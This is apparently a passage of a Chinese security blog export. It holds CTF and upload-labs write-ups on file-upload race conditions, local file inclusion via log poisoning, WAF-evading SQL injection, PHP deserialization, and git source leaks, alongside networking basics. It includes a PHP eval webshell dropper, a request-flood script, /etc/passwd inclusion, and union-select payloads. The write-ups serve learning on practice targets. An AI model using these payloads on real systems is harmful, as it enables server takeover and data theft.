class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从源码来看，服务器先是将上传的文件保存下来，然后将文件的后缀名同白名单对比，如果是jpg、png、gif中的一种，就将文件进行重命名。如果不符合的话，unlink()函数就会删除该文件。</p>
<p>这么看来如果我们还是上传一个图片马的话，网站依旧存在文件包含漏洞我们还是可以进行利用。但是如果没有文件包含漏洞的话，我们就只能上传一个php木马来解析运行了。</p>
<p>那还怎么搞？上传上去就被删除了，我还怎么去访问啊。</p>
<p>不慌不慌，要知道代码执行的过程是需要耗费时间的。如果我们能在上传的一句话被删除之前访问不就成了。这个也就叫做条件竞争上传绕过。</p>
<p>我们可以利用burp多线程发包，然后不断在浏览器访问我们的webshell，会有一瞬间的访问成功。</p>
<p>为了更好的演示效果，把一句话木马换一下改为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;Tony.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;Tony&quot;])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>把这个php文件通过burp一直不停的重放，然后再写python脚本去不停的访问我们上传的这个文件，总会有那么一瞬间是还没来得及删除就可以被访问到的，一旦访问到该文件就会在当前目录下生成一个Tony.php的一句话。在正常的渗透测试中这也是个好办法。因为单纯的去访问带有phpinfo()的文件并没有什么效果。一旦删除了还是无法利用。但是这个办法生成的Tony.php服务器是不会删除的，我们就可以通过蚁剑去链接了。</p>
<p>首先，我们上传PHP文件，用BP拦截</p>
<p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/1670844131435-f6274afc-0101-4013-9ed7-10c55ffc6377.png" alt="img"></p>
<p>进行下一步操作前，这里有个小细节，就是不要把BP的拦截功能关闭了，要一直保持拦截状态以达到测试更好的效果</p>
<p>然后选择Clear$   没有负载 无限期地重复</p>
<p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/1670844166973-4dd92ed5-744c-4ade-b3c0-ffbc653623eb.png" alt="img"></p>
<p>然后我们写一个python脚本，通过它来不停的访问我们上传上去的PHP文件(即如上图显示的zoe.php文件) 由于隐私原因，IP地址不能放出来，下面的脚本的url地址XXX都是代表IP地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.5/upload-labs-master/upload/tiaojian.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>接下来我们可以在BP点击开始攻击</p>
<p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/1670844556643-e38dc429-33bc-445b-935c-962654536bd8.png" alt="img"></p>
<p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/1670844633168-e60f69d7-d925-4c46-a86d-e358f330fdec.png" alt="img">可以看到上传该文件的数据包不停地在进行重放。</p>
<p>在BP攻击的同时我们也要运行python脚本，目的就是不停地访问jingzheng.php知道成功访问到为止。当出现OK说明访问到了该文件，那么Tony.php应该也创建成功了，用蚁剑连一下试试。</p>
<p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/1670844660776-7678e6c3-cf32-487b-a0eb-778feb675d0f.png" alt="img"></p>
<p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/1670844688661-eb7acf2b-fca8-4caf-8baa-5a015e53b782.png" alt="img"></p>
<h3 id="Pass19条件竞争（与18略微不同，大致相同）"><a href="#Pass19条件竞争（与18略微不同，大致相同）" class="headerlink" title="Pass19条件竞争（与18略微不同，大致相同）"></a>Pass19条件竞争（与18略微不同，大致相同）</h3><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>没有对上传的文件做判断，只对用户输入的文件名做判断<br>后缀名黑名单<br>上传的文件名用户可控<br>黑名单用于用户输入的文件后缀名进行判断<br>move_uploaded_file()还有这么一个特性，会忽略掉文件末尾的 /.</p>
<p>所以/.绕过</p>
<p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/1670848966768-d5073801-0dce-4325-bf41-e00d85c7b095.png" alt="img"></p>
<h2 id="文件包含知识点"><a href="#文件包含知识点" class="headerlink" title="文件包含知识点"></a>文件包含知识点</h2><p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/1670847860537-dd02ebb5-0a46-4fcd-8503-a6320c4c30b3.png" alt="img"></p>
<h2 id="参考文件"><a href="#参考文件" class="headerlink" title="参考文件"></a>参考文件</h2><p><a href="https://blog.csdn.net/weixin_47598409/article/details/115050869">https://blog.csdn.net/weixin_47598409/article/details/115050869</a></p>
<p><a href="https://www.jianshu.com/p/55a50c4bf576">https://www.jianshu.com/p/55a50c4bf576</a></p>
<p><a href="https://www.lxhsec.com/2020/01/05/upload-labs-writeup/">https://www.lxhsec.com/2020/01/05/upload-labs-writeup/</a></p>
<p><a href="https://xz.aliyun.com/t/2435#toc-9">https://xz.aliyun.com/t/2435#toc-9</a></p>
]]></content>
      <categories>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>本地文件包含与远程文件包含</title>
    <url>/2023/01/07/%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h2 id="1-本地文件包含漏洞"><a href="#1-本地文件包含漏洞" class="headerlink" title="1.本地文件包含漏洞"></a>1.本地文件包含漏洞</h2><p>  本地文件包含（LFI）漏洞是PHP中一种典型的高危漏洞。由于程序员未对用户可控的变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web服务器将特定文件当成php执行，从而导致用户可获取一定的服务器权限。</p>
<span id="more"></span>

<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>(1）两个文件在同一目录下</p>
<p>(2）若不在同一目录，包含的文件路径必须写相对路径或绝对路径</p>
<p>(3）被包含的页面的后缀无论是什么都会当作php解析</p>
<h2 id="2-远程文件包含漏洞"><a href="#2-远程文件包含漏洞" class="headerlink" title="2.远程文件包含漏洞"></a>2.远程文件包含漏洞</h2><p>远程文件包含漏洞（RFI)，它其实也属于”代码注入”的一种,其原理就是注入一段用户能控制的脚本或代码，并让其在服务端执行。</p>
<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>(1) allow_url_fopen ON(默认ON)</p>
<p>(2) allow_url_include ON (默认OFF)</p>
<p>(3）被包含的变量前没有目录的限制</p>
<h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><p>(1）远程包含文件路径必须为绝对路径</p>
<p>(2）被包含的文件不能够被服务器解析，如php文件</p>
]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含常用函数</title>
    <url>/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>include()</p>
<p>require()</p>
<p>fopen()</p>
<p>include_once()</p>
<p>require_once()</p>
<p>readfile()</p>
<span id="more"></span>

<h2 id="include-与require-区别"><a href="#include-与require-区别" class="headerlink" title="include()与require()区别"></a>include()与require()区别</h2><p>当包含一个不存在的文件时，include会报错，但是下面的语句正常执行，而require就会报错并停止脚步继续执行。</p>
<h2 id="include-once-与require-once-区别"><a href="#include-once-与require-once-区别" class="headerlink" title="include_once()与require_once()区别"></a>include_once()与require_once()区别</h2><p>当之前包含过一个文件时，就不会再包含了</p>
<h2 id="fopen-与readfile"><a href="#fopen-与readfile" class="headerlink" title="fopen()与readfile()"></a>fopen()与readfile()</h2><p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/1672882660228-68caa210-f9c8-4e8a-bf9b-faa0ea17a1ee.png" alt="img"></p>
]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>(目录穿越)HNCTF中的一道题</title>
    <url>/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/</url>
    <content><![CDATA[<p>[WEEK2]easy_include</p>
<p>​      这个题直接包含日志，在UA头写入一句话木马，然后就可以include到当前php文件中，实现命令执行。</p>
<p>注意一个问题就是，每次的日志会记录，所以，上传命令之后，如果产生报错或者不执行的情况必须重启容器。</p>
<p>再就是可能会有人问为什么发送第二次包的时候才会出现flag。这是因为发送第一个包的时候，将你的一句话木马写入access.log日志，第二次发包才包含到前一次的日志中的木马。</p>
<span id="more"></span>

<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668072737521-06c907d2-9a64-4886-a93e-43a6bc19c3cc.png" alt="img"></p>
<p>构造payload：     ?file=/etc/passwd  可以访问内网文件</p>
<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668072775580-591516be-aa57-4813-b4d8-45683350f308.png" alt="img"></p>
<p>nginx的日志文件为/var/log/nginx/access.log</p>
<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668072964901-350e88e1-12d2-4dd5-bc82-c5dd5dcdffe9.png" alt="img"></p>
<p>构造UA头一句话木马</p>
<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668073159817-8b29b857-b91b-40a0-b40d-c5ecde48c1d3.png" alt="img"></p>
]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>(绕waf)[SWPUCTF 2021 新生赛]sql</title>
    <url>/2023/01/07/%E7%BB%95waf-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-sql/</url>
    <content><![CDATA[<p><img src="/2023/01/07/%E7%BB%95waf-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-sql/1670987374639-4c9ed84c-df0f-453f-ae38-9e15ddbfbce7.png" alt="img"></p>
<span id="more"></span>

<p><img src="/2023/01/07/%E7%BB%95waf-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-sql/1670987396171-c5179e77-8527-40a0-ab63-6d470a6fdd8e.png" alt="img"></p>
<p>正常测试</p>
<h1 id="按照标题参数wllm"><a href="#按照标题参数wllm" class="headerlink" title="按照标题参数wllm"></a>按照标题参数wllm</h1><p>?wllm=1 – 正常<br>?wllm=1’ – 报错<br>?wllm=1’%23 – 正常<br>?wllm=-1’or 1=1%23 – 发现有过滤</p>
<h1 id="测试过滤"><a href="#测试过滤" class="headerlink" title="测试过滤"></a>测试过滤</h1><p>空格，等号<br>空格=&gt;/**/<br>等号=&gt;like</p>
<h1 id="测试长度"><a href="#测试长度" class="headerlink" title="测试长度"></a>测试长度</h1><p>?wllm=1’order/<em><em><strong>/by/*</strong></em>/3%23 – 正常<br>?wllm=1’order/</em><em><strong>/by/*</strong></em>/4%23 – 错误<br>– 测试长度为3</p>
<h1 id="测试回显"><a href="#测试回显" class="headerlink" title="测试回显"></a>测试回显</h1><p>?wlmm=-1’union/****/select/****/1,2,3%23 # 2,3回显位置</p>
<h1 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h1><p>?wllm=-1’union/****/select/****/1,2,database()%23 # test_db</p>
<h1 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h1><p>?wllm=-1’union/<em><em><strong>/select/*</strong></em>/1,2,group_concat(table_name)/</em><em><strong>/from/*</strong></em>/informa<br>tion_schema.tables/<em><em><strong>/where/*</strong></em>/table_schema/</em><em><strong>/like/*</strong></em>/‘test_db’%23<br><img src="/2023/01/07/%E7%BB%95waf-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-sql/1670987553033-2d493f9c-2a69-46a2-a928-3fd1e9d8d19e.png" alt="img"></p>
<p>– LTLT_flag,users</p>
<h1 id="查列"><a href="#查列" class="headerlink" title="查列"></a>查列</h1><p>?wllm=-1’union/<em><em><strong>/select/*</strong></em>/1,2,group_concat(column_name)/</em><em><strong>/from/*</strong></em>/inform<br>ation_schema.columns/<em><em><strong>/where/*</strong></em>/table_schema/</em><em><strong>/like/*</strong></em>/‘test_db’%23<br><img src="/2023/01/07/%E7%BB%95waf-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-sql/1670987604766-6e7b5395-2625-4cf7-98bb-bda4ad61a3d9.png" alt="img"></p>
<p>– id,flag,id,username</p>
<h1 id="查内容"><a href="#查内容" class="headerlink" title="查内容"></a>查内容</h1><p>?wllm=-1’union/<em><em><strong>/select/*</strong></em>/1,2,group_concat(flag)/</em><em><strong>/from/*</strong></em>/test_db.LTLT_<br>flag%23</p>
<p><img src="/2023/01/07/%E7%BB%95waf-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-sql/1670987626714-4f1d2ff4-9ca8-4673-9ab3-3d05385cc24f.png" alt="img"></p>
<h1 id="位数长度不足"><a href="#位数长度不足" class="headerlink" title="位数长度不足"></a>位数长度不足</h1><p>使用截断函数进行绕过，substr，right，REVERSE 被过滤（测试出来的），只能用mid</p>
<h1 id="mid截取，因为回显只能有20个，所以20，一组截取"><a href="#mid截取，因为回显只能有20个，所以20，一组截取" class="headerlink" title="mid截取，因为回显只能有20个，所以20，一组截取"></a>mid截取，因为回显只能有20个，所以20，一组截取</h1><p>?wllm=-1’union/<em><em><strong>/select/*</strong></em>/1,2,mid(group_concat(flag),20,20)/</em><em><strong>/from/*</strong></em>/tes<br>t_db.LTLT_flag%23</p>
<p><img src="/2023/01/07/%E7%BB%95waf-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-sql/1670987685675-aacbaba8-2fac-45a2-8427-5b47cb88c5fc.png" alt="img"></p>
<p><img src="/2023/01/07/%E7%BB%95waf-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-sql/1670987714459-0ee3f487-7179-44f6-8caf-8ff40f930aba.png" alt="img"></p>
<p><img src="/2023/01/07/%E7%BB%95waf-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-sql/1670987742801-f437aedb-f2f2-402d-ab8d-fcf7f67126cb.png" alt="img"></p>
<h1 id="需要读三组"><a href="#需要读三组" class="headerlink" title="需要读三组"></a>需要读三组</h1><p>NSSCTF{21f84ca4-e37e-48a4-ac36-7787f9901954}</p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>(绕过_wakeup魔法函数)[SWPUCTF 2021 新生赛]no_wakeup</title>
    <url>/2023/01/07/%E7%BB%95%E8%BF%87-wakeup%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;class.php&quot;);</span><br><span class="line"></span><br><span class="line">class HaHaHa&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        public $admin;</span><br><span class="line">        public $passwd;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">            $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        public function __wakeup()&#123;             	//_wakeup魔法函数，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务</span><br><span class="line">            $this-&gt;passwd = sha1($this-&gt;passwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;</span><br><span class="line">                include(&quot;flag.php&quot;);</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo $this-&gt;passwd;</span><br><span class="line">                echo &quot;No wake up&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$Letmeseesee = $_GET[&#x27;p&#x27;];</span><br><span class="line">unserialize($Letmeseesee);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>在34行程序调用反序列化方法时，会自动执行__weakup()函数，而显然weakup方法会加密上传的序列化参数中的passwd，而sha1是不可逆加密算法，目前也没有合适的sha1碰撞的方式，故考虑到绕过__weakup()函数；</p>
<p>php的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __weakup(); 因而先构造序列化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HaHaHa&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        public $admin;</span><br><span class="line">        public $passwd;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">            $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __wakeup()&#123;</span><br><span class="line">            $this-&gt;passwd = sha1($this-&gt;passwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;</span><br><span class="line">                include(&quot;flag.php&quot;);</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo $this-&gt;passwd;</span><br><span class="line">                echo &quot;No wake up&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$aa=new HaHaHa();</span><br><span class="line">$aa-&gt;admin=&quot;admin&quot;;</span><br><span class="line">$aa-&gt;passwd=&quot;wllm&quot;;</span><br><span class="line">$stus=serialize($aa);</span><br><span class="line">print_r($stus);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/07/%E7%BB%95%E8%BF%87-wakeup%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/1671072021557-69d0075f-fe21-47ff-865f-e01fc6d01c89.png" alt="img"></p>
<p>将序列化得到的          O:6:”HaHaHa”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}</p>
<p>改为               O:6:”HaHaHa”:3:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}</p>
<p>即可绕过__wakeup</p>
<p><img src="/2023/01/07/%E7%BB%95%E8%BF%87-wakeup%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/1671072102334-c745feff-7182-4544-9f3c-9ea5dd1ac934.png" alt="img"></p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>网安基础总结一</title>
    <url>/2022/04/24/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%80/</url>
    <content><![CDATA[<h1 id="域名："><a href="#域名：" class="headerlink" title="域名："></a>域名：</h1><p>顶级域名，又称一级域名，常见的有”.com”、”.org”、”.net”、”.cn”等<br><a href="https://link.zhihu.com/?target=http://baidu.com">http://baidu.com</a> 一级域名</p>
<span id="more"></span>

<p>二级域名<br>bbs.baidu .com 二级域名<br>tieba.baidu .com 二级域名</p>
<p>多级域名：</p>
<p><strong>.</strong>.__.com</p>
<p>顶级域名：</p>
<p>com 商业机构</p>
<p>edu 教育及研究机构</p>
<p>firm 公司企业</p>
<p>gov 政府机构</p>
<p>info 信息服务</p>
<p>net 网络服务机构</p>
<p>nom 个人</p>
<p>org 专业团体</p>
<p>rec 娱乐类机构</p>
<p>store 销售类公司企业</p>
<p>web 从事WWW活动的机构</p>
<p><img src="/2022/04/24/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%80/1650793701278-17310527-b80c-4d68-a0f9-9c41824c75ec.jpeg" alt="img"></p>
<p><img src="/2022/04/24/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%80/1650793262618-7d9f30ac-3e21-4056-906a-4223e49d8a70.png" alt="img"></p>
<h1 id="DNS是什么："><a href="#DNS是什么：" class="headerlink" title="DNS是什么："></a>DNS是什么：</h1><p>DNS是域名系统,Domain Name System的缩写,服务域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。</p>
<p>DNS就是把域名解析为IP地址，提供我们上网，我们能够上网最终是找到IP地址。</p>
<p>比如，<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a>是域名，那么他的IP地址假设是144.144.144.144，我们用浏览器访问该的网页，先到DNS服务器找<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a>对应的IP地址，然后通过IP地址进行访问。</p>
<p>域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。</p>
<p>DNS服务器地址:</p>
<p>域名解释服务器,打比方,当你在地址栏输入 <a href="http://www.dns.com/">www.dns.com</a> 时,电脑不是直接就连接到百度的服务器里的,而是先向这个DNS服务器查询<a href="http://www.dns.com的ip地址,然后再按照这个ip地址转到百度的服务器里.一般都是每个地区有一个特定的dns服务器的,由isp提供的/">www.dns.com的IP地址,然后再按照这个IP地址转到百度的服务器里.一般都是每个地区有一个特定的DNS服务器的,由ISP提供的</a>.</p>
<p>由于ISP的拨号服务器一般都有缺省的DNS，所以你可以不用设置DNS，如果你需要指定一台DNS，你一定要了解这台DNS的准确IP（比如福州的163用户的DNS为202.101.98.55）。DNS设置方法如下：在“控制面板”下打开“网络”里的“TCP/IP”的“属性”，在“DNS设置”栏目选择“启用DNS”，并将DNS的IP地址添加即可。</p>
<p>IP192.168.X.X一般都是带有路由的IP，网关默认最后1位肯定是1，子网掩码 255.255.255.0简单说C类的IP，子网都可以这样设置</p>
<p>我的理解：DNS服务器地址就是将人们可以理解的域名解析成计算机可以获取的二进制语言（也就是这个域名实际所代表的IP地址）</p>
<h1 id="什么是CDN："><a href="#什么是CDN：" class="headerlink" title="什么是CDN："></a>什么是CDN：</h1><p>cdn全称是内容分发网络。其目的是让用户能够更快速的得到请求的数据。简单来讲，cdn就是用来加速的，他能让用户就近访问数据，这样就更更快的获取到需要的数据。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了<br>CDN与DNS的关系：</p>
<p>dns与cdn的关系<br>刚才说到cdn实际上是一个就近访问，那么现在有一个问题是，我们怎么知道用户的所在位置从而给他分配最佳的cdn节点呢。这就需要dns服务来进行定位了。当我们通过使用dns服务的时候，可以根据他使用的LDNS服务器来进行一个定位，例如我们的调度服务器看到他是来自深圳电信的LDNS服务器，那么我们就认为该用户来自深圳电信，然后调度服务器可以让该用户去访问深圳电信的CDN服务器，这样就让用户访问到了最优的cdn节点。<br>通过dns服务我们可以很快的定位到用户的位置，然后给用户分配最佳cdn节点，但是这种调度方式存在一个问题，例如，当我 是北京联通的用户但是使用的却是深圳电信的ldns的话，调度服务器会给我分配到深圳电信的cdn服务器，这样就产生了错误的调度。</p>
<h1 id="网站程序产生漏洞："><a href="#网站程序产生漏洞：" class="headerlink" title="网站程序产生漏洞："></a>网站程序产生漏洞：</h1><p>SQL注入，文件上传，xss，代码执行，变量覆盖，逻辑漏洞，反序列化。</p>
]]></content>
      <categories>
        <category>网安基础篇</category>
      </categories>
      <tags>
        <tag>web基础</tag>
      </tags>
  </entry>
  <entry>
    <title>网安基础总结七</title>
    <url>/2022/11/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%83/</url>
    <content><![CDATA[<h2 id="一、学习记录"><a href="#一、学习记录" class="headerlink" title="一、学习记录"></a>一、学习记录</h2><h3 id="1-1git泄露"><a href="#1-1git泄露" class="headerlink" title="1.1git泄露"></a>1.1git泄露</h3><p>既然题目提示了git泄露漏洞，那么直接下载源码</p>
<p><img src="/2022/11/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%83/1668326767960-f8c4c010-0017-4ee5-a219-ff086689a9e1.png" alt="img"></p>
<span id="more"></span>

<p>python2 GitHack.py <a href="http://challenge-924aa806bf44244c.sandbox.ctfhub.com:10800/.git/">http://challenge-924aa806bf44244c.sandbox.ctfhub.com:10800/.git/</a></p>
<p>cd E:\tools\githack\dist\challenge-924aa806bf44244c.sandbox.ctfhub.com_10800<img src="/2022/11/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%83/1668326803125-bdae248e-5cf5-4b23-b4d5-fe198c48d3ca.png" alt="img"></p>
<p>git log //查看历史记录</p>
<p>git diff 57a6016556eba2e627e194b58d11833dec535a37  //比较版本</p>
<p><img src="/2022/11/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%83/1668326815312-39ef32eb-1087-49b1-91b8-777fbe88800c.png" alt="img"></p>
